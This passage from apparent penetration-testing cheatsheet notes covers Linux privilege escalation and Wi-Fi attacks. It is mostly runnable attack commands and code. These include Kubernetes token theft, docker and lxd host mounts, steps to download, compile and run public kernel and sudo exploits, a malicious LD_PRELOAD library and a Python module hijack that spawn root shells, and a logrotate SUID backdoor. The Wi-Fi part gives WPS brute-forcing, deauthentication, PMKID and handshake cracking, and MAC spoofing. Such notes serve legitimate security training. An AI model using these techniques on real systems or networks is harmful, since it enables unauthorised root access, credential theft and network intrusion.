environmental variables to change how expansions occur. Kubernetes Inside Container If <code>kubectl</code> or a service account token is present, you may be able to create privileged pods or mount the host: <pre><code>ls /var/run/secrets/kubernetes.io/serviceaccount\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\nkubectl run --rm -it --image=alpine debug -- /bin/sh\n</code></pre> If you can define a pod with <code>hostPID: true</code> and <code>privileged: true</code>, you can namespace-enter the host.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/General%20Information/","title":"General Information","text":"<p>Basic Info <pre><code>whoami; id; hostname;\n</code></pre> Networking <pre><code>ip a\n</code></pre> Can you run anything as sudo <pre><code>sudo -l\n</code></pre> What operating system do we have? <pre><code>cat /etc/os-release\n</code></pre> Check user path <pre><code>echo $PATH\n</code></pre> check environment variables <pre><code>env\n</code></pre> Check kernel version <pre><code>uname -a\ncat /proc/version\n</code></pre> Check CPU info <pre><code>lscpu\n</code></pre> Check login shells <pre><code>cat /etc/shells\n</code></pre> Check attached printers: <pre><code>lpstat\n</code></pre> Check users and groups: <pre><code>cat /etc/passwd\ncat /etc/group\n</code></pre> Check who is in a group: <pre><code>getent group sudo\n</code></pre> Check home directories of users on system and inspect their history files: <pre><code>find /home -maxdepth 2 -type f -name \".*history\" -exec ls -l {} \\; 2&gt;/dev/null\nfind /home -type f -name \".bash_history\" -o -name \".zsh_history\" 2&gt;/dev/null\n</code></pre> Check running processes as root <pre><code>ps aux | grep root\n</code></pre> Env vars <pre><code>env\nprintenv\n</code></pre> Check mounted filesystems <pre><code>mount\ndf -h\n</code></pre> Check open network sockets: <pre><code>ss -tulpn\nnetstat -tulpn\n</code></pre> check crons <pre><code>crontab -l 2&gt;/dev/null\nls -la /var/spool/cron/crontabs\nls -la /etc/cron.*\ncat /etc/crontab\n</code></pre> Check system information available in <code>/proc</code>: <pre><code>find /proc -name cmdline -exec cat {} \\; 2&gt;/dev/null | tr \" \" \"\\n\"\n</code></pre> Kernel version <pre><code>uname -a\nuname -r\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Groups/","title":"Groups","text":"<p>Common Privileged Groups</p> <ul> <li>docker: Members can mount host filesystem via Docker daemon.</li> <li>disk: Can mount and read disk devices.</li> <li>lxd / lxc: Can spawn or modify containers and potentially escape.</li> <li>lpadmin, www-data, adm: Depending on context, may allow log reading or injection</li> </ul> <p>Docker group <pre><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n</code></pre> unzip alpine image <pre><code>unzip alpine.zip\n</code></pre> Choose defaults for all prompts - help: How to Set Up and Use LXD on Ubuntu 16.04 | DigitalOcean <pre><code>lxd init\n</code></pre> Import the image <pre><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine\n</code></pre> set privilege flag <pre><code>lxc init alpine r00t -c security.privileged=true\n</code></pre> Mount file system <pre><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true\n</code></pre> <pre><code>lxc start r00t\nlxc exec r00t /bin/sh\n</code></pre> on the host type <code>cd /mnt/root/root</code>. From here we can read sensitive files such as <code>/etc/shadow</code> and obtain password hashes or gain access to SSH keys in order to connect to the host system as root</p> <p>Disk</p> <p>Users within the disk group have full access to any devices contained within <code>/dev</code>, such as <code>/dev/sda1</code>, which is typically the main device used by the operating system. An attacker with these privileges can use <code>debugfsto</code> access the entire file system with root level privileges.</p> <p>ADM</p> <p>Members of the adm group are able to read all logs stored in <code>/var/log</code>. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Low-Level%20Exploits/","title":"Low Level Exploits","text":"<p>Check Kernel Version for Known CVEs <pre><code>uname -r\n    ```\nExample vulnerable ranges:\n\n- **Dirty COW** (CVE-2016-5195): Linux \u2264 4.8\n- **Dirty Pipe** (CVE-2022-0847): Linux 5.8+ &lt; 5.10.102 / &lt; 5.15.25 / &lt; 5.17.9\n- **Other kernel 0-days**: search on [Exploit-DB](https://www.exploit-db.com/), [CVE Details](https://www.cvedetails.com/), or use `searchsploit`.\n**Dirty Cow**\n```bash\nwget https://raw.githubusercontent.com/dirtycow/dirtycow/master/dirtyc0w.c\ngcc dirtyc0w.c -o dirtycow\n./dirtycow\n</code></pre> Dirty Pipe <pre><code>git clone https://github.com/ashishb/dirtypipe.git\ncd dirtypipe\ngcc dirtypipe.c -o dirtypipe\n./dirtypipe\n</code></pre> CVE-2022-27666 (Netfilter Privilege Escalation) <pre><code>git clone https://github.com/niklasb/CVE-2022-27666.git\ncd CVE-2022-27666\nmake\n./cve-2022-27666\n</code></pre> CVE-2021-3156 (Sudo \u201cBaron Samedit\u201d) (\u2264 1.8.31p2) is vulnerable <pre><code>git clone https://github.com/blasty/CVE-2021-3156.git\ncd CVE-2021-3156\ngcc cve-2021-3156.c -o exploit\n./exploit\n</code></pre> CVE-2021-3560 (Polkit) <pre><code>git clone https://github.com/berdav/CVE-2021-3560.git\ncd CVE-2021-3560\ngcc cve-2021-3560.c -o exploit\n./exploit\n</code></pre> Check and load kernel Modules <pre><code>lsmod                # list loaded modules\nsudo modprobe tun    # check if tun module can be loaded\n</code></pre> - If you have <code>CAP_SYS_MODULE</code>, you can compile and load a malicious kernel module to gain root. - </p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/NFS%2C%20Samba%2C%20Network%20Shares/","title":"NFS, Samba, Network Shares","text":"<p>NFS Shares <pre><code>showmount -e target_host   # enumerate exports\nmount -t nfs target_host:/exported/path /mnt\n</code></pre> If you can write to a writable NFS export that\u2019s mounted on the server\u2019s root (e.g., <code>/home</code>), you can place an SSH key in <code>/mnt/root/.ssh/authorized_keys</code>. Samba / CIFS <pre><code>mount -t cifs //server/share /mnt -o username=user,password=pass,noperm\n</code></pre> If <code>noperm</code> is set or the share is writable by user, you can: <pre><code>chown root:root /mnt/myscript.sh\nchmod 4755 /mnt/myscript.sh\n</code></pre> If a root-owned service executes <code>myscript.sh</code> from <code>/mnt</code>, you gain root.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Permissions/","title":"Permissions","text":"<p>SUID <pre><code>find / -perm /4000 -type f 2&gt;/dev/null\n</code></pre> SGID <pre><code>find / -perm -2000 -type f 2&gt;/dev/null\n</code></pre> writeable SUIDs <pre><code>find / -perm -4000 -type f -writable 2&gt;/dev/null\n</code></pre> - If a SUID binary is writable by your user, you can replace it with code that spawns a root shell.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Restricted%20Shells/","title":"Restricted Shells","text":"<p>Check shell <pre><code>echo $0\n</code></pre> Can you switch shells? <pre><code>/bin/bash -p\n</code></pre> spawn shell with <code>vi</code> <pre><code>vi -c ':!bash'\nvi -c ':!sh'\n</code></pre> <code>more</code> or <code>less</code> to spawn shell <pre><code>more /etc/passwd\n# then type \u201c!sh\u201d to open shell\n</code></pre> find for execution <pre><code>find . -exec /bin/sh \\; -quit\n</code></pre> perl or python <pre><code>perl -e 'exec \"/bin/sh\";'\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> awk <pre><code>awk 'BEGIN { system(\"/bin/sh\") }'\n</code></pre> If <code>ssh</code> client is available, you can do <code>ssh user@localhost</code> if key-based auth exists.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/","title":"Service Based Escalation","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/#cron","title":"Cron","text":"<p>List All Cron Jobs <pre><code>cat /etc/crontab\nls -la /etc/cron.d/\nls -la /etc/cron.daily/\nls -la /etc/cron.hourly/\nls -la /etc/cron.weekly/\nls -la /etc/cron.monthly/\nls -la /var/spool/cron/crontabs/\n</code></pre> - Check for writable directories with scripts / what the script is calling</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/#logrotate-based-escapes","title":"Logrotate-Based Escapes","text":"<p><pre><code>ls -la /etc/logrotate.d/\ncat /etc/logrotate.conf\n</code></pre> If you can write to a file in <code>/etc/logrotate.d/</code>, add a <code>postrotate</code> script that creates a SUID binary: <pre><code>/var/log/myapp/*.log {\n    daily\n    missingok\n    rotate 7\n    notifempty\n    compress\n    sharedscripts\n    postrotate\n        cp /bin/bash /tmp/rootbash\n        chmod +s /tmp/rootbash\n    endscript\n}\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Service-Based%20Escalation/#systemd-sysv-init-scripts","title":"Systemd &amp; SysV Init Scripts","text":"<p>List Systemd Service Files <pre><code>ls -la /etc/systemd/system/*.service\nls -la /lib/systemd/system/*.service\n</code></pre> Inspect Service File Contents <pre><code>cat /etc/systemd/system/vulnerable.service\n</code></pre> Look for fields like <code>ExecStart=/usr/bin/somescript.sh</code>. If <code>somescript.sh</code> is writable, replace it with malicious code. Check for Writable <code>/etc/default</code> or <code>/etc/sysconfig</code> Files Many SysV init scripts source configuration from <code>/etc/default/servicename</code> or <code>/etc/sysconfig/servicename</code>. If writable, you can modify the environment the service runs in or the path to the binary. Reload &amp; Restart Service to Trigger Execution <pre><code>systemctl daemon-reload\nsystemctl restart vulnerable.service\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/","title":"Shared Libraries & Interpreter Hijacking","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/#ld_preload-shared-library-hijacking","title":"LD_PRELOAD &amp; Shared Library Hijacking","text":"<ol> <li>Find Binaries That Honor LD_PRELOAD (Including SUID) <pre><code>find / -perm -4000 -type f 2&gt;/dev/null | while read -r bin; do\n  echo \"[*] Checking $bin\"\n  ldd \"$bin\" 2&gt;/dev/null | grep \"=&gt;\" &amp;&amp; echo \"[+] $bin loads shared libs\"\ndone\n</code></pre></li> <li>Create a Malicious Shared Object <pre><code>// exploit.c\n#include &lt;unistd.h&gt;\nvoid __attribute__((constructor)) init() {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/sh\");\n}\n</code></pre> <pre><code>gcc -shared -fPIC -o /tmp/exploit.so exploit.c\n</code></pre></li> <li>Preload &amp; Execute the SUID Binary <pre><code>export LD_PRELOAD=/tmp/exploit.so\n/path/to/suid_binary\n</code></pre></li> <li>If the binary loads <code>libc</code> or another library, your <code>exploit.so</code> runs as root.</li> <li>Modify <code>/etc/ld.so.conf.d</code> if Writable <pre><code>echo \"/home/user/mylibs\" &gt; /etc/ld.so.conf.d/malicious.conf\nldconfig\n</code></pre></li> <li>Place your <code>.so</code> in <code>/home/user/mylibs</code> and run the vulnerable binary.</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/#python-module-hijacking","title":"Python Module Hijacking","text":"<ol> <li>Locate SUID Python Scripts <pre><code>find / -perm -4000 -type f | grep \"\\.py$\" 2&gt;/dev/null\n</code></pre></li> <li>Create malicious python module <pre><code>mkdir -p /tmp/malicious\ncat &lt;&lt; 'EOF' &gt; /tmp/malicious/pickle.py\nimport os\nos.setuid(0)\nos.system(\"/bin/sh\")\nEOF\n</code></pre></li> <li>Set PYTHONPATH and Run the Script <pre><code>export PYTHONPATH=/tmp/malicious:$PYTHONPATH\n/usr/bin/vulnerable_suid_script.py\n</code></pre></li> <li>If <code>vulnerable_suid_script.py</code> does <code>import pickle</code> (or another module you control), it spawns a root shell.</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Writable%20Directories/","title":"Writable Directories","text":"<p>Find World-Writable Directories <pre><code>find / -type d -perm -002 -ls 2&gt;/dev/null\n</code></pre> Find World-Writable Files <pre><code>find / -type f -perm -002 -ls 2&gt;/dev/null\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/","title":"Attacking","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/#wpawpa2","title":"WPA/WPA2","text":"<p>Main attack methods:</p> <ol> <li>Check if WPS is enabled and brute-force the PIN.</li> <li>Capture the 4-way handshake and perform a dictionary attack to recover the PSK.</li> <li>Execute a PMKID attack on vulnerable access points.</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/#wps-brute-force","title":"WPS Brute force","text":"<p>Check if wps is enabled:</p> <p>with airodump: <pre><code>airodump-ng wlan0mon -c 1 --wps\n</code></pre></p> <p>0:  WPS is not supported by the access point. 1:  WPS is enabled but not configured. 2:  WPS is enabled and configured.</p> <p>with wash: <pre><code>wash -i wlan0mon\n</code></pre> if Lck = No, WPS is enabled.</p> <p>Also, determine the vendor with the first three sets from the MAC <pre><code>grep -i \"28-B2-BD\" /var/lib/ieee-data/oui.txt\n</code></pre></p> <p>Bruteforce WPS key with reaver</p> <p>turn off monitor mode from airmon to ensure Reaver works. <pre><code>airmon-ng stop wlan0mon\n</code></pre></p> <p>use the iw command to add a new interface named mon0 and set its type to monitor mode.</p> <pre><code>iw dev wlan0 interface add mon0 type monitor\nifconfig mon0 up\n</code></pre> <p>Launch Reaver specifying the BSSID of our target, the appropriate channel, and our interface in monitor mode (mon0)</p> <pre><code>reaver -i mon0 -c 1 -b 28:B2:BD:F4:FF:F1\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/#cracking-mic-4-way-handshake","title":"Cracking MIC (4-Way Handshake)","text":"<p>Capture the MIC</p> <pre><code>sudo airmon-ng start wlan0\n</code></pre> <p>Identify networks (save to file WPA)</p> <pre><code>airodump-ng wlan0mon -c 1 -w WPA\n</code></pre> <p>Deauth clients and capture handshake on reconnect</p> <pre><code>aireplay-ng -0 5 -a &lt;AP BSSID&gt; -c &lt;STATION&gt; wlan0mon\n</code></pre> <p>After a few seconds a WPA handshake should be captured in the airodump output. <pre><code> CH  1 ][ Elapsed: 48 s ][ 2024-08-29 21:58 ][ WPA handshake: 80:2D:BF:FE:13:83 \n</code></pre></p> <p>We need to ensure we've captured the complete handshake before attempting to crack</p> <p>With cowpatty: <code>-c</code> = check mode <pre><code>cowpatty -c -r WPA-01.cap\n</code></pre></p> <p>or with wireshark:</p> <p>check the following:</p> <ul> <li>All four EAPOL messages exist per each handshake in sequential order</li> <li>Key nonce values are the same in message 1 and 3</li> <li>For message four, we should see no key nonce value and only a MIC value.</li> </ul> <p>Crack the handshake</p> <p>with cowpatty: <pre><code>cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s &lt;SSID&gt;\n</code></pre></p> <p>or with aircrack</p> <pre><code>aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap \n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/#pmkid-attack","title":"PMKID Attack","text":"<p>This attack utilizes a feature of WPA and WPA2 protocols that allows roaming (switching from one access point to another seamlessly), routers store the \"PMKID\" in a cache to make roaming easier. This attack is so powerful because it allows an attacker to capture and crack the PMK without first deauthing clients.</p> <p>Put interface into monitor mode <pre><code>sudo airmon-ng start wlan0\n</code></pre></p> <p>scan for the target network and determine if it is vulnerable to the PMKID attack. We need to monitor for these three status codes: 1. EAPOL 2. ASSOCIATION and REASSOCIATION 3. EAPOL and ASSOCIATION and REASSOCIATION</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/#for-hcxtools-629","title":"For hcxtools &lt;= 6.2.9","text":"<p><pre><code>hcxdumptool -i wlan0mon --enable_status=3\n</code></pre> We want to see the <code>PMKID</code> in the output, now we discover the bssid with aerodump</p> <pre><code>airodump-ng wlan0mon --essid targetnetwork\n</code></pre> <p>Once we have the bssid of the target, we can properly target with hcxdumptool</p> <pre><code>hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=E2:73:E7:F5:98:91 --filtermode=2 -o PMKIDCap.pcap\n</code></pre> <p>I can take a very long time to capture the PMKID, you can speed it up by executing the command again</p> <p>Now we can convert the pcap to a hash to crack</p> <pre><code>hcxpcapngtool -o hash PMKIDCap.pcap\n</code></pre> <p>Now Crack the hash</p> <pre><code>hashcat -m 22000 --force hash /opt/wordlist.txt\nhashcat -m 22000 --force hash /opt/wordlist.txt --show\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/#for-hcxtools-630","title":"For hcxtools &gt;= 6.3.0","text":"<p>Generate a BPF file</p> <p>One AP:</p> <pre><code>hcxdumptool --bpfc=\"wlan addr3 &lt;BSSID&gt;\" &gt; SSID.bpf\n</code></pre> <p>Multiple:</p> <pre><code>hcxdumptool --bpfc=\"wlan addr3 &lt;BSSID1&gt; or wlan addr3 &lt;BSSID2&gt;\" &gt; SSID.bpf\n</code></pre> <p>Run against target</p> <pre><code>sudo hcxdumptool --rds=1 -F --bpf=SSID.bpf -i wlan1mon -w outfile.pcapng\n</code></pre> <p>You are looking for a <code>+</code> under the 3 or the P column. Convert to hash and crack (dictionary)</p> <pre><code>hcxpcapngtool -o hash PMKIDCap.pcap\nhashcat -m 22000 --force hash /opt/wordlist.txt\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Attacking/#deauth-attacks","title":"Deauth attacks","text":"<p>List attack modes</p> <pre><code>aireplay-ng\n\n Attack modes (numbers can still be used):\n      --deauth      count : deauthenticate 1 or all stations (-0)\n      --fakeauth    delay : fake authentication with AP (-1)\n      --interactive       : interactive frame selection (-2)\n      --arpreplay         : standard ARP-request replay (-3)\n      --chopchop          : decrypt/chopchop WEP packet (-4)\n      --fragment          : generates valid keystream   (-5)\n      --caffe-latte       : query a client for new IVs  (-6)\n      --cfrag             : fragments against a client  (-7)\n      --migmode           : attacks WPA migration mode  (-8)\n      --test              : tests injection and quality (-9)\n\n      --help              : Displays this usage screen\n</code></pre> Attack Attack Name <code>Attack 0</code> Deauthentication <code>Attack 1</code> Fake authentication <code>Attack 2</code> Interactive packet replay <code>Attack 3</code> ARP request replay attack <code>Attack 4</code> KoreK chopchop attack <code>Attack 5</code> Fragmentation attack <code>Attack 6</code> Cafe-latte attack <code>Attack 7</code> Client-oriented fragmentation attack <code>Attack 8</code> WPA Migration Mode <code>Attack 9</code> Injection test <p>Before sending deauthentication frames, it's important to verify if our wireless card can successfully inject frames into the target access point (AP).</p> <ol> <li>Enable monitor mode on channel</li> </ol> <pre><code>airmon-ng start wlan0 1\n</code></pre> <ol> <li>test for packet injection</li> </ol> <p><pre><code>sudo aireplay-ng --test wlan0mon\n</code></pre> (we should see <code>Injection is working!</code>)</p> <p>Now we know we can inject packets with our interface, lets perform the deauth</p> <p>Identify the AP <pre><code>sudo airodump-ng wlan0mon\n\nCH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][\n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         \n 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB \n 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             \n\n BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes\n\n 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14           HTB \n (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4            \n 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5           HTB \n 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           jhony\n</code></pre></p> <p>From the above output, we can see that there are three available WiFi networks, and <code>two clients</code> are connected to the network named <code>HTB</code>. Let's send a deauthentication request to one of the clients with the station ID <code>00:0F:B5:32:31:31</code>.</p> <p><pre><code>sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon\n</code></pre> - <code>-0</code> means deauthentication - <code>5</code> is the number of deauths to send (you can send multiple if you wish); <code>0</code> means send them continuously - <code>-a 00:14:6C:7A:41:81</code> is the MAC address of the access point - <code>-c 00:0F:B5:32:31:31</code> is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated - <code>wlan0mon</code> is the interface name</p> <p>Once the clients are deauthenticated from the AP, we can continue observing <code>airodump-ng</code> to see when they reconnect.</p> <pre><code>sudo airodump-ng wlan0mon\n\nCH  1 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ][ WPA handshake: 00:14:6C:7A:41:81\n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n 00:09:5B:1C:AA:1D   11  16       10        0    0   1  54.  OPN              TOMMY                         \n 00:14:6C:7A:41:81   34 100       57       14    1   1  11e  WPA  TKIP   PSK  HTB \n 00:14:6C:7E:40:80   32 100      752       73    2   1  54   WPA  TKIP   PSK  jhony                             \n\n BSSID              STATION            PWR   Rate   Lost  Frames   Notes  Probes\n\n 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24   212     145   EAPOL  HTB \n (not associated)   00:14:A4:3F:8D:13   19    0-0      0       4            \n 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36     0       5          HTB \n 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54     0       9          jhony\n</code></pre> <p>In the output above, we can see that after sending the deauthentication packet, the client disconnects and then reconnects. This is evidenced by the increase in <code>Lost</code> packets and <code>Frames</code> count.</p> <p>Additionally, a <code>four-way handshake</code> would be captured by <code>airodump-ng</code>, as shown in the output. By using the <code>-w</code> option in airodump-ng, we can save the captured WPA handshake into a <code>.pcap</code> file. This file can then be used with tools like <code>aircrack-ng</code> to crack the pre-shared key (PSK)</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Bypassing%20MAC%20Filtering/","title":"Bypassing MAC Filtering","text":"<p>First scan for available networks <pre><code>sudo airodump-ng wlan0mon\n</code></pre></p> <p>Find the network you're trying to connect to and copy one of the clients mac addresses.</p> <p>Just stealing a client mac might suck due to mac collisions. </p> <p>A better method is to either 1. deauth the client or 2. wait for the client to disconnect naturally before connecting. </p> <p>We can also check if there is a 5 GHz band available for the ESSID. If the 5 GHz band is available, we can attempt to connect to the network using that frequency, which would avoid collision events since most clients are connected to the 2.4 GHz band.</p> <pre><code>sudo airodump-ng wlan0mon --band a\n</code></pre> <p>https://github.com/alobbs/macchanger</p> <pre><code>sudo macchanger wlan0\n</code></pre> <p>Change mac:</p> <p><pre><code>sudo ifconfig wlan0 down\n</code></pre> <pre><code>sudo macchanger wlan0 -m 3E:48:72:B7:62:2A\n</code></pre> <pre><code>sudo ifconfig wlan0 up\n</code></pre></p> <p>now try to connect! </p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Cracking%20Passphrases/","title":"Cracking Passphrases","text":"<p>Make sure you have a powerful enough system to perform cracking operations <pre><code>aircrack-ng -S\n\n1628.101 k/s\n</code></pre></p> <p>The above output estimates that our CPU can crack approximately 1,628.101 passphrases per second.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Cracking%20Passphrases/#cracking-wep","title":"Cracking WEP","text":"<p>Aircrack-ng is capable of recovering the WEP key once a sufficient number of encrypted packets have been captured using Airodump-ng. It is possible to save only the captured IVs (Initialization Vectors) using the <code>--ivs</code> option in Airodump-ng. Once enough IVs are captured, we can utilize the <code>-K</code> option in Aircrack-ng, which invokes the Korek WEP cracking method to crack the WEP key.</p> <pre><code>aircrack-ng -K cap.ivs \n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Cracking%20Passphrases/#cracking-wpa","title":"Cracking WPA","text":"<p>We need to first capture a four-way handshake, then we can use a dictionary attack to try to crack the key.</p> <p>Aircrack truly only needs two packets  Specifically, EAPOL packets 2 and 3, or packets 3 and 4, are considered a full handshake.</p> <pre><code>aircrack-ng WPA.pcap -w /opt/wordlist.txt\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Decrypting%20Captures/","title":"Decrypting Captures","text":"<p>We can decrypt <code>WEP</code>, <code>WPA PSK</code>, and <code>WPA2 PSK</code> captures with airdecap-ng. it can remove wireless headers from an unencrypted capture file. This tool is particularly useful in analyzing the data within captured packets by making the content readable and removing unnecessary wireless protocol information.</p> <p>Airdecap-ng can be used for the following:</p> <ul> <li>Removing wireless headers from an open network capture (Unencrypted capture).</li> <li>Decrypting a WEP-encrypted capture file using a hexadecimal WEP key.</li> <li>Decrypting a WPA/WPA2-encrypted capture file using the passphrase.</li> </ul> <pre><code>airdecap-ng [options] &lt;pcap file&gt;\n</code></pre> Option Description <code>-l</code> don't remove the 802.11 header <code>-b</code> access point MAC address filter <code>-k</code> WPA/WPA2 Pairwise Master Key in hex <code>-e</code> target network ascii identifier <code>-p</code> target network WPA/WPA2 passphrase <code>-w</code> target network WEP key in hexadecimal <code>Airdecap-ng</code> generates a new file with the suffix <code>-dec.cap</code> <p>the decrypted capture file using <code>airdecap-ng</code>, observe how the <code>Protocol</code> tab displays the correct protocol, such as ARP, TCP, DHCP, HTTP, etc. Additionally, notice how the <code>Info</code> tab provides more detailed information, and it correctly displays the <code>source</code> and <code>destination</code> IP addresses.</p> <p>Removing Wireless Headers from Unencrypted Capture file (open network):</p> <pre><code>airdecap-ng -b &lt;bssid&gt; &lt;capture-file&gt;\n</code></pre> <p>Replace with the MAC address of the access point and with the name of the capture file.</p> <pre><code>sudo airdecap-ng -b 00:14:6C:7A:41:81 opencapture.cap\n</code></pre> <p>Decrypting WEP-encrypted captures</p> <p>Requires hexadecimal WEP key <pre><code>airdecap-ng -w &lt;WEP-key&gt; &lt;capture-file&gt;\n</code></pre></p> <p>Decrypting WPA-encrypted captures</p> <p>Needs passphrase and essid of the network</p> <pre><code>airdecap-ng -p &lt;passphrase&gt; &lt;capture-file&gt; -e &lt;essid&gt;\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Driver%20Installation%20Alfa%20A1US036ACS/","title":"Driver Installation Alfa A1US036ACS","text":"<pre><code>sudo apt install -y linux-headers-$(uname -r) build-essential bc dkms git libelf-dev rfkill iw\n</code></pre> <pre><code>git clone https://github.com/morrownr/8821au-20210708.git\n</code></pre> <pre><code>sudo ./install-driver.sh\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Finding%20Hidden%20Networks/","title":"Finding Hidden Networks","text":"<p>Set wifi interface to monitor mode</p> <pre><code>sudo airmon-ng start wlan0\n</code></pre> <p>Can for networks</p> <pre><code>sudo airodump-ng -c 1 wlan0mon\n\nCH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45 \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\n\n B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  &lt;length: 12&gt;                                \n D2:A3:32:13:29:D5  -28   0        9        0    0   1   54   WPA3 CCMP   SAE  &lt;length:  8&gt;                                \n A2:FF:31:2C:B1:C4  -28   0        9        0    0   1   54   WPA2 CCMP   PSK  &lt;length:  4&gt;                                \n\n BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes\n\n B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4   \n</code></pre> <p>we can see that there are three hidden SSIDs. The <code>&lt;length: x&gt;</code> notation indicates the length of the WiFi network name</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/wifi/Finding%20Hidden%20Networks/#detecting-ssid-name-with-deauth","title":"Detecting SSID name with Deauth","text":"<p>we can deauth clients and capture the reconnection requests.</p> <p>From the above <code>airodump-ng</code> scan, we observed that a client with the STATION ID <code>02:00:00:00:02:00</code> is connected to the BSSID <code>B2:C1:3D:3B:2B:A1</code>. Let's start the <code>airodump-ng</code> capture on channel <code>1</code> and use <code>aireplay-ng</code> to send deauthentication requests to the client.</p> <p>We should start sniffing our network on <code>channel 1</code> with airodump-ng. <pre><code>sudo airodump-ng -c 1 wlan0mon\n</code></pre></p> <p>In order to force the client to send a probe request, it needs to be disconnected. We can do this with aireplay-ng.</p> <pre><code>sudo aireplay-ng -0 10 -a 